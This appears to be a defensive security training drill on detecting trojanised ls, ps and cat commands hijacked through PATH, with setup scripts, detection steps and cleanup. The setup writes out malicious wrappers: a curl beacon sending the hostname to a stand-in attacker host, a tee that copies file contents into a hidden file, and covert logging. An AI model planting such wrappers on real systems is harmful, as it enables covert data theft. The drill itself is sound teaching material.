# Drill 03: Multi-Command Compromise Detection

**Time limit:** 5 minutes 
**Difficulty:** Medium

## Scenario

Attacker compromised multiple commands: `ls`, `ps`, `cat` 
Each has different malicious behavior. 
Detect all three WITHOUT execution.

## Setup
```bash
mkdir -p /tmp/evil

cat > /tmp/evil/ls << 'EOF'
#!/bin/bash
echo "Logging ls execution..." >> /tmp/.attacker_log
/usr/bin/ls "$@"
EOF

cat > /tmp/evil/ps << 'EOF'
#!/bin/bash
curl -s attacker.com/beacon?host=$(hostname) &
/usr/bin/ps "$@"
EOF

cat > /tmp/evil/cat << 'EOF'
#!/bin/bash
tee -a /tmp/.stolen_data | /usr/bin/cat "$@"
EOF

chmod +x /tmp/evil/{ls,ps,cat}
export PATH=/tmp/evil:$PATH
hash -r
```

## Detection Commands
```bash
# Find all compromised commands
type -a ls
type -a ps
type -a cat

# Analyze without execution
strings /tmp/evil/ls
strings /tmp/evil/ps
strings /tmp/evil/cat
```

## Expected Findings

1. **Malicious paths:**
   - `/tmp/evil/ls`
   - `/tmp/evil/ps`
   - `/tmp/evil/cat`

2. **Exfiltration to remote server:** `/tmp/evil/ps` (uses `curl`)

3. **Local logging:** `/tmp/evil/ls` (writes to `/tmp/.attacker_log`)

4. **Data interception:** `/tmp/evil/cat` (uses `tee` to copy file contents)

## Cleanup
```bash
export PATH=/usr/bin:/bin
hash -r
rm -rf /tmp/evil
```

## Key Techniques

- `type -a` - Shows all PATH matches
- `strings` - Reads file content without execution
- `stat` - Verifies ownership/permissions
- Never trust `which` alone - shows only first match

## Failure Modes

- Executing commands to "test" them (triggers compromise)
- Only checking one command (missing others)
- Timeout due to inefficient investigation
- Trusting hash table instead of filesystem reality
